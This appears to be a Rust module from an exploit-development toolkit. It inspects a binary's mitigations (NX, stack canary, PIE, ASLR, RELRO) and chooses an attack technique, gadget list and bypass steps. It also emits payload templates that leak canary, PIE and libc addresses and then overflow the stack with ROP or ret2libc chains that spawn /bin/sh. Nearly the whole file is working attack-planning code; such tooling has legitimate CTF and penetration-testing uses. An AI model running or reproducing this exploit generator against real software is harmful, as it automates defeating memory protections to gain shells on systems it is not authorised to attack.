use crate::binary_analyzer::{BinaryAnalysis, BinaryAnalyzer, BinaryProtections, RelroLevel};
use crate::rop_tools::{Architecture, RopChain};
use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MitigationDetector {
    binary_path: String,
    protections: BinaryProtections,
    architecture_str: String,
    bitness: usize,
    analysis: Option<BinaryAnalysis>,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum ExploitTechnique {
    DirectShellcode,
    RopChain,
    Ret2Libc,
    Ret2PLT,
    Ret2CSU,
    SROP,
    FormatStringWrite,
    HeapSpray,
    StackPivot,
    Hybrid,
}

impl std::fmt::Display for ExploitTechnique {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            ExploitTechnique::DirectShellcode => write!(f, "Direct Shellcode Injection"),
            ExploitTechnique::RopChain => write!(f, "ROP Chain"),
            ExploitTechnique::Ret2Libc => write!(f, "Return-to-libc"),
            ExploitTechnique::Ret2PLT => write!(f, "Return-to-PLT"),
            ExploitTechnique::Ret2CSU => write!(f, "Return-to-CSU"),
            ExploitTechnique::SROP => write!(f, "Sigreturn-Oriented Programming"),
            ExploitTechnique::FormatStringWrite => write!(f, "Format String Arbitrary Write"),
            ExploitTechnique::HeapSpray => write!(f, "Heap Spray"),
            ExploitTechnique::StackPivot => write!(f, "Stack Pivot"),
            ExploitTechnique::Hybrid => write!(f, "Hybrid Exploitation"),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExploitStrategy {
    pub primary_technique: ExploitTechnique,
    pub requires_leak: Vec<LeakRequirement>,
    pub bypass_steps: Vec<BypassStep>,
    pub constraints: Vec<String>,
    pub estimated_complexity: Complexity,
    pub alignment_required: Option<usize>,
    pub gadgets_needed: Vec<String>,
    pub shellcode_constraints: ShellcodeConstraints,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum LeakRequirement {
    CanaryLeak,
    PIEBaseLeak,
    LibcBaseLeak,
    StackAddressLeak,
    HeapAddressLeak,
}

impl std::fmt::Display for LeakRequirement {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            LeakRequirement::CanaryLeak => write!(f, "Stack Canary Leak"),
            LeakRequirement::PIEBaseLeak => write!(f, "PIE Base Address Leak"),
            LeakRequirement::LibcBaseLeak => write!(f, "Libc Base Address Leak"),
            LeakRequirement::StackAddressLeak => write!(f, "Stack Address Leak"),
            LeakRequirement::HeapAddressLeak => write!(f, "Heap Address Leak"),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BypassStep {
    pub protection: String,
    pub technique: String,
    pub description: String,
    pub priority: u8,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq, PartialOrd, Ord)]
pub enum Complexity {
    Trivial,
    Low,
    Medium,
    High,
    Extreme,
}

impl std::fmt::Display for Complexity {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Complexity::Trivial => write!(f, "Trivial"),
            Complexity::Low => write!(f, "Low"),
            Complexity::Medium => write!(f, "Medium"),
            Complexity::High => write!(f, "High"),
            Complexity::Extreme => write!(f, "Extreme"),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ShellcodeConstraints {
    pub max_size: Option<usize>,
    pub bad_chars: Vec<u8>,
    pub alphanumeric_only: bool,
    pub position_independent: bool,
}

impl Default for ShellcodeConstraints {
    fn default() -> Self {
        ShellcodeConstraints {
            max_size: None,
            bad_chars: vec![0x00],
            alphanumeric_only: false,
            position_independent: false,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LeakStrategy {
    pub leak_type: LeakRequirement,
    pub method: String,
    pub gadgets_needed: Vec<String>,
    pub example_code: String,
}

impl MitigationDetector {
    pub fn new(binary_path: &str) -> Result<Self, String> {
        log::info!("Initializing Mitigation Detector for {}", binary_path);

        let analysis = BinaryAnalyzer::analyze(binary_path)?;
        let protections = analysis.protections.clone();
        let architecture_str = analysis.architecture.clone();

        Ok(MitigationDetector {
            binary_path: binary_path.to_string(),
            protections,
            architecture_str,
            bitness: analysis.bitness,
            analysis: Some(analysis),
        })
    }

    fn get_architecture(&self) -> Architecture {
        match self.architecture_str.as_str() {
            "x86_64" => Architecture::X8664,
            "i386" => Architecture::I386,
            "ARM" => Architecture::ARM,
            arch if arch.contains("aarch64") => Architecture::ARM64,
            _ => Architecture::X8664,
        }
    }

    pub fn get_protections(&self) -> &BinaryProtections {
        &self.protections
    }

    pub fn analyze_strategy(&self) -> Result<ExploitStrategy, String> {
        log::info!("Analyzing exploit strategy for {}", self.binary_path);

        let mut strategy = ExploitStrategy {
            primary_technique: ExploitTechnique::DirectShellcode,
            requires_leak: Vec::new(),
            bypass_steps: Vec::new(),
            constraints: Vec::new(),
            estimated_complexity: Complexity::Trivial,
            alignment_required: None,
            gadgets_needed: Vec::new(),
            shellcode_constraints: ShellcodeConstraints::default(),
        };

        if self.protections.nx {
            log::info!("NX detected - switching to ROP-based exploitation");
            strategy.primary_technique = ExploitTechnique::RopChain;
            strategy.bypass_steps.push(BypassStep {
                protection: "NX (Non-Executable Stack)".to_string(),
                technique: "Return-Oriented Programming (ROP)".to_string(),
                description: "Use ROP gadgets to execute code without injecting shellcode".to_string(),
                priority: 1,
            });
            strategy.constraints.push("Must use ROP chain or ret2libc".to_string());
            strategy.gadgets_needed.extend(vec![
                "pop rdi; ret".to_string(),
                "pop rsi; ret".to_string(),
                "pop rdx; ret".to_string(),
            ]);
        }

        if self.protections.canary {
            log::info!("Stack canary detected - leak required");
            strategy.requires_leak.push(LeakRequirement::CanaryLeak);
            strategy.bypass_steps.push(BypassStep {
                protection: "Stack Canary".to_string(),
                technique: "Canary Leak via Format String or Info Leak".to_string(),
                description: "Leak canary value before overwriting to avoid detection".to_string(),
                priority: 1,
            });
            strategy.constraints.push("Must leak canary before overflow".to_string());
        }

        if self.protections.pie {
            log::info!("PIE detected - base address leak required");
            strategy.requires_leak.push(LeakRequirement::PIEBaseLeak);
            strategy.bypass_steps.push(BypassStep {
                protection: "PIE (Position Independent Executable)".to_string(),
                technique: "Leak code address to calculate base".to_string(),
                description: "Leak any code pointer to defeat ASLR for binary".to_string(),
                priority: 2,
            });
            strategy.constraints.push("Must leak binary base address".to_string());
        }

        if self.protections.aslr || self.protections.pie {
            if strategy.primary_technique == ExploitTechnique::RopChain 
                || strategy.primary_technique == ExploitTechnique::Ret2Libc {
                strategy.requires_leak.push(LeakRequirement::LibcBaseLeak);
                strategy.bypass_steps.push(BypassStep {
                    protection: "ASLR (libc randomization)".to_string(),
                    technique: "Leak libc address via GOT/PLT".to_string(),
                    description: "Leak GOT entry to calculate libc base for ret2libc".to_string(),
                    priority: 2,
                });
                strategy.constraints.push("Must leak libc base for ret2libc".to_string());
            }
        }

        if matches!(self.protections.relro, RelroLevel::Full) {
            log::info!("Full RELRO detected - GOT overwrite not possible");
            strategy.constraints.push("GOT overwrite impossible (Full RELRO)".to_string());
            strategy.bypass_steps.push(BypassStep {
                protection: "Full RELRO".to_string(),
                technique: "Direct ROP exploitation".to_string(),
                description: "Cannot overwrite GOT entries, use direct ROP chain".to_string(),
                priority: 3,
            });
        }

        if matches!(self.get_architecture(), Architecture::X8664) {
            log::info!("x64 architecture - 16-byte stack alignment required");
            strategy.alignment_required = Some(16);
            strategy.constraints.push("Stack must be 16-byte aligned for system calls".to_string());
        }

        strategy.estimated_complexity = self.calculate_complexity(&strategy);

        strategy.shellcode_constraints = self.build_shellcode_constraints();

        Ok(strategy)
    }

    pub fn generate_leak_strategy(&self, leak_type: &LeakRequirement) -> LeakStrategy {
        match leak_type {
            LeakRequirement::CanaryLeak => LeakStrategy {
                leak_type: leak_type.clone(),
                method: "Format string vulnerability or partial overwrite".to_string(),
                gadgets_needed: vec![],
                example_code: r#"
// Option 1: Format string leak
let canary = leak_format_string(conn, offset)?;

// Option 2: Partial overflow read
payload = cyclic(size) + padding;
conn.send(payload);
leaked = conn.recv(timeout: 1000);
canary = extract_canary(leaked);
"#.to_string(),
            },
            LeakRequirement::PIEBaseLeak => LeakStrategy {
                leak_type: leak_type.clone(),
                method: "Leak code pointer via format string or info leak".to_string(),
                gadgets_needed: vec![],
                example_code: r#"
// Leak a code address (e.g., return address on stack)
leaked_addr = leak_stack_address(conn, offset)?;
pie_base = leaked_addr - offset_from_base;
log("PIE base: 0x" + hex(pie_base));
"#.to_string(),
            },
            LeakRequirement::LibcBaseLeak => LeakStrategy {
                leak_type: leak_type.clone(),
                method: "Leak GOT entry or libc pointer".to_string(),
                gadgets_needed: vec!["pop rdi; ret".to_string()],
                example_code: r#"
// Option 1: Leak GOT entry
rop = ROP(elf);
rop.call("puts", [elf.got["puts"]]);
rop.call(elf.symbols["main"]);  // Return to main
conn.send(rop.chain());
leaked_puts = unpack64(conn.recv(6));
libc_base = leaked_puts - libc.symbols["puts"];
log("libc base: 0x" + hex(libc_base));

// Option 2: Format string leak
libc_leak = leak_format_string(conn, libc_offset)?;
libc_base = libc_leak - offset;
"#.to_string(),
            },
            LeakRequirement::StackAddressLeak => LeakStrategy {
                leak_type: leak_type.clone(),
                method: "Leak stack pointer via format string".to_string(),
                gadgets_needed: vec![],
                example_code: r#"
// Leak stack address to calculate buffer location
stack_leak = leak_format_string(conn, stack_offset)?;
buffer_addr = stack_leak - buffer_offset;
log("Buffer at: 0x" + hex(buffer_addr));
"#.to_string(),
            },
            LeakRequirement::HeapAddressLeak => LeakStrategy {
                leak_type: leak_type.clone(),
                method: "Leak heap pointer via UAF or heap overflow".to_string(),
                gadgets_needed: vec![],
                example_code: r#"
// Leak heap address via use-after-free
free(chunk1);
heap_leak = read_freed_chunk();
heap_base = heap_leak & 0xfffffffffffff000;
log("Heap base: 0x" + hex(heap_base));
"#.to_string(),
            },
        }
    }

    pub fn auto_pivot_strategy(&self, rop_chain: &RopChain) -> Result<ExploitStrategy, String> {
        let mut strategy = self.analyze_strategy()?;

        if self.protections.nx {
            log::info!("Auto-pivoting from shellcode to ROP due to NX");
            strategy.primary_technique = ExploitTechnique::RopChain;

            let available_gadgets = rop_chain.gadgets.len();
            if available_gadgets < 10 {
                log::warn!("Low gadget count ({}) - considering alternative techniques", available_gadgets);
                
                if available_gadgets >= 3 {
                    strategy.primary_technique = ExploitTechnique::Ret2Libc;
                    strategy.gadgets_needed = vec![
                        "pop rdi; ret".to_string(),
                        "ret".to_string(),
                    ];
                } else {
                    strategy.primary_technique = ExploitTechnique::Ret2PLT;
                    strategy.constraints.push("Minimal gadgets - use PLT entries directly".to_string());
                }
            } else {
                log::info!("Sufficient gadgets ({}) - full ROP chain viable", available_gadgets);
                strategy.gadgets_needed.extend(vec![
                    "pop rdi; ret".to_string(),
                    "pop rsi; ret".to_string(),
                    "pop rdx; ret".to_string(),
                    "pop rax; ret".to_string(),
                    "syscall".to_string(),
                ]);
            }
        }

        if matches!(self.get_architecture(), Architecture::X8664) {
            strategy.alignment_required = Some(16);
        }

        Ok(strategy)
    }

    pub fn build_adaptive_payload(&self, strategy: &ExploitStrategy) -> Result<String, String> {
        let mut payload_template = String::new();

        payload_template.push_str(&format!("// Exploit Strategy: {}\n", strategy.primary_technique));
        payload_template.push_str(&format!("// Complexity: {}\n\n", strategy.estimated_complexity));

        if !strategy.requires_leak.is_empty() {
            payload_template.push_str("// PHASE 1: Information Leaks\n");
            for leak in &strategy.requires_leak {
                let leak_strat = self.generate_leak_strategy(leak);
                payload_template.push_str(&format!("// {}: {}\n", leak, leak_strat.method));
                payload_template.push_str(&leak_strat.example_code);
                payload_template.push('\n');
            }
        }

        payload_template.push_str("// PHASE 2: Exploitation\n");
        match strategy.primary_technique {
            ExploitTechnique::DirectShellcode => {
                payload_template.push_str(r#"
// Direct shellcode injection (no NX)
let shellcode = shellcode_db.get("execve_sh")?;
let payload = cyclic(offset) + shellcode;
conn.send(payload);
conn.interactive();
"#);
            }
            ExploitTechnique::RopChain => {
                payload_template.push_str(r#"
// ROP chain exploitation
let rop = ROP(elf);
"#);
                if strategy.alignment_required == Some(16) {
                    payload_template.push_str(r#"
// Add alignment gadget for x64
rop.add_gadget("ret");  // 16-byte stack alignment
"#);
                }
                payload_template.push_str(r#"
rop.call("execve", ["/bin/sh", 0, 0]);
let payload = cyclic(offset) + canary + padding + rop.chain();
conn.send(payload);
conn.interactive();
"#);
            }
            ExploitTechnique::Ret2Libc => {
                payload_template.push_str(r#"
// Ret2libc exploitation
let rop = ROP(elf);
rop.call(libc.symbols["system"], [bin_sh_addr]);
let payload = cyclic(offset) + canary + padding + rop.chain();
conn.send(payload);
conn.interactive();
"#);
            }
            ExploitTechnique::Ret2PLT => {
                payload_template.push_str(r#"
// Ret2PLT exploitation (minimal gadgets)
let payload = cyclic(offset) + pack64(elf.plt["system"]) + pack64(bin_sh_addr);
conn.send(payload);
conn.interactive();
"#);
            }
            _ => {
                payload_template.push_str("// Advanced technique - manual implementation required\n");
            }
        }

        Ok(payload_template)
    }

    fn calculate_complexity(&self, strategy: &ExploitStrategy) -> Complexity {
        let mut score = 0;

        if self.protections.nx {
            score += 2;
        }
        if self.protections.canary {
            score += 2;
        }
        if self.protections.pie {
            score += 2;
        }
        if self.protections.aslr {
            score += 1;
        }
        if matches!(self.protections.relro, RelroLevel::Full) {
            score += 1;
        }
        if self.protections.fortify {
            score += 1;
        }

        if strategy.requires_leak.len() >= 3 {
            score += 2;
        } else if strategy.requires_leak.len() >= 2 {
            score += 1;
        }

        match score {
            0..=2 => Complexity::Trivial,
            3..=4 => Complexity::Low,
            5..=6 => Complexity::Medium,
            7..=8 => Complexity::High,
            _ => Complexity::Extreme,
        }
    }

    fn build_shellcode_constraints(&self) -> ShellcodeConstraints {
        let mut constraints = ShellcodeConstraints::default();

        if self.protections.nx {
            constraints.bad_chars.extend(&[0x0a, 0x0d]);
        }

        if self.protections.pie {
            constraints.position_independent = true;
        }

        constraints
    }

    pub fn recommend_gadgets(&self, rop_chain: &RopChain) -> Vec<(String, Option<u64>)> {
        let mut recommendations = Vec::new();

        let essential_gadgets = match self.get_architecture() {
            Architecture::X8664 => vec![
                "pop rdi; ret",
                "pop rsi; ret",
                "pop rdx; ret",
                "pop rax; ret",
                "syscall",
                "ret",
            ],
            Architecture::I386 => vec![
                "pop eax; ret",
                "pop ebx; ret",
                "pop ecx; ret",
                "pop edx; ret",
                "int 0x80",
                "ret",
            ],
            _ => vec!["ret"],
        };

        for pattern in essential_gadgets {
            let addr = rop_chain.find_gadget(pattern);
            recommendations.push((pattern.to_string(), addr));
        }

        recommendations
    }

    pub fn validate_strategy(&self, strategy: &ExploitStrategy, rop_chain: &RopChain) -> Result<ValidationReport, String> {
        let mut report = ValidationReport {
            is_viable: true,
            missing_gadgets: Vec::new(),
            warnings: Vec::new(),
            suggestions: Vec::new(),
        };

        for gadget in &strategy.gadgets_needed {
            if rop_chain.find_gadget(gadget).is_none() {
                report.missing_gadgets.push(gadget.clone());
                report.warnings.push(format!("Missing critical gadget: {}", gadget));
            }
        }

        if !report.missing_gadgets.is_empty() {
            report.is_viable = false;
            report.suggestions.push("Consider alternative exploit techniques".to_string());
        }

        if strategy.requires_leak.contains(&LeakRequirement::CanaryLeak) && !self.protections.canary {
            report.warnings.push("Strategy requires canary leak but no canary detected".to_string());
        }

        if matches!(strategy.estimated_complexity, Complexity::High | Complexity::Extreme) {
            report.warnings.push(format!("High complexity exploit: {}", strategy.estimated_complexity));
            report.suggestions.push("Consider staged exploitation or information gathering phase".to_string());
        }

        Ok(report)
    }

    pub fn get_analysis(&self) -> Option<&BinaryAnalysis> {
        self.analysis.as_ref()
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ValidationReport {
    pub is_viable: bool,
    pub missing_gadgets: Vec<String>,
    pub warnings: Vec<String>,
    pub suggestions: Vec<String>,
}

impl std::fmt::Display for ExploitStrategy {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        writeln!(f, "Exploit Strategy Report")?;
        writeln!(f, "=======================")?;
        writeln!(f, "Primary Technique: {}", self.primary_technique)?;
        writeln!(f, "Estimated Complexity: {}", self.estimated_complexity)?;
        
        if let Some(alignment) = self.alignment_required {
            writeln!(f, "Stack Alignment: {}-byte", alignment)?;
        }

        if !self.requires_leak.is_empty() {
            writeln!(f, "\nRequired Information Leaks:")?;
            for leak in &self.requires_leak {
                writeln!(f, "  - {}", leak)?;
            }
        }

        if !self.bypass_steps.is_empty() {
            writeln!(f, "\nMitigation Bypass Steps:")?;
            for step in &self.bypass_steps {
                writeln!(f, "  [Priority {}] {}: {}", step.priority, step.protection, step.technique)?;
            }
        }

        if !self.constraints.is_empty() {
            writeln!(f, "\nConstraints:")?;
            for constraint in &self.constraints {
                writeln!(f, "  - {}", constraint)?;
            }
        }

        if !self.gadgets_needed.is_empty() {
            writeln!(f, "\nRequired Gadgets:")?;
            for gadget in &self.gadgets_needed {
                writeln!(f, "  - {}", gadget)?;
            }
        }

        Ok(())
    }
}

impl std::fmt::Display for ValidationReport {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        writeln!(f, "Strategy Validation Report")?;
        writeln!(f, "=========================")?;
        writeln!(f, "Viable: {}", if self.is_viable { "Yes" } else { "No" })?;

        if !self.missing_gadgets.is_empty() {
            writeln!(f, "\nMissing Gadgets:")?;
            for gadget in &self.missing_gadgets {
                writeln!(f, "  - {}", gadget)?;
            }
        }

        if !self.warnings.is_empty() {
            writeln!(f, "\nWarnings:")?;
            for warning in &self.warnings {
                writeln!(f, "  - {}", warning)?;
            }
        }

        if !self.suggestions.is_empty() {
            writeln!(f, "\nSuggestions:")?;
            for suggestion in &self.suggestions {
                writeln!(f, "  - {}", suggestion)?;
            }
        }

        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_complexity_calculation() {
        let strategy = ExploitStrategy {
            primary_technique: ExploitTechnique::RopChain,
            requires_leak: vec![LeakRequirement::CanaryLeak, LeakRequirement::PIEBaseLeak],
            bypass_steps: vec![],
            constraints: vec![],
            estimated_complexity: Complexity::Medium,
            alignment_required: Some(16),
            gadgets_needed: vec![],
            shellcode_constraints: ShellcodeConstraints::default(),
        };

        assert_eq!(strategy.estimated_complexity, Complexity::Medium);
    }

    #[test]
    fn test_leak_requirement_display() {
        assert_eq!(format!("{}", LeakRequirement::CanaryLeak), "Stack Canary Leak");
        assert_eq!(format!("{}", LeakRequirement::PIEBaseLeak), "PIE Base Address Leak");
    }

    #[test]
    fn test_exploit_technique_display() {
        assert_eq!(format!("{}", ExploitTechnique::RopChain), "ROP Chain");
        assert_eq!(format!("{}", ExploitTechnique::Ret2Libc), "Return-to-libc");
    }

    #[test]
    fn test_shellcode_constraints_default() {
        let constraints = ShellcodeConstraints::default();
        assert_eq!(constraints.bad_chars, vec![0x00]);
        assert!(!constraints.alphanumeric_only);
        assert!(!constraints.position_independent);
    }

    #[test]
    fn test_validation_report_display() {
        let report = ValidationReport {
            is_viable: true,
            missing_gadgets: vec![],
            warnings: vec!["Test warning".to_string()],
            suggestions: vec!["Test suggestion".to_string()],
        };
        let display = format!("{}", report);
        assert!(display.contains("Viable: Yes"));
        assert!(display.contains("Test warning"));
    }

    #[test]
    fn test_exploit_strategy_display() {
        let strategy = ExploitStrategy {
            primary_technique: ExploitTechnique::RopChain,
            requires_leak: vec![LeakRequirement::CanaryLeak],
            bypass_steps: vec![],
            constraints: vec!["Test constraint".to_string()],
            estimated_complexity: Complexity::Medium,
            alignment_required: Some(16),
            gadgets_needed: vec!["pop rdi; ret".to_string()],
            shellcode_constraints: ShellcodeConstraints::default(),
        };
        let display = format!("{}", strategy);
        assert!(display.contains("ROP Chain"));
        assert!(display.contains("16-byte"));
    }
}
